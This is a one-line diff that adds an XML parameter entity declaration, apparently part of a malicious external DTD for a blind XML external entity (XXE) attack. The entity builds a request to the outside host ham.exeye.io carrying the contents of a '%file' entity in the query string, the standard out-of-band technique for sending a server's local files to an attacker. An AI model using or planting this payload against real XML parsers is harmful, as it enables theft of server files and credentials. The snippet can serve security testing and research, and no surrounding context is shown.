@@ -1,0 +1,1 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://ham.exeye.io/?%file;'>">
